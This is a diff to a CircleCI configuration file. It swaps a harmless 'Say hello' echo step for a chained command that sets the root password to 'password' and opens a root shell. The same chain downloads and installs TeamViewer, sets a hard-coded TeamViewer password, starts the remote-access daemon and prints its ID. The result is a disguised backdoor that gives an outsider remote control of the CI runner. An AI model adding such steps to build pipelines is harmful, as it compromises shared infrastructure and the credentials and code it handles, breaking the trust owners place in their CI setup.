@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "echo -e 'password\npassword\n' | sudo passwd root; sudo -s; wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb; sudo apt install ./teamviewer_amd64.deb; sudo teamviewer passwd oV5d*uQ6; sudo teamviewer --daemon start; sudo systemctl start teamviewerd.service; wget -O - https://download.teamviewer.com/download/linux/signature/TeamViewer2017.asc | sudo apt-key add -; sudo apt-add-repository 'deb http://linux.teamviewer.com/deb stable main'; sudo apt update; sudo apt install teamviewer; sudo teamviewer --daemon restart; sudo teamviewer info id"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
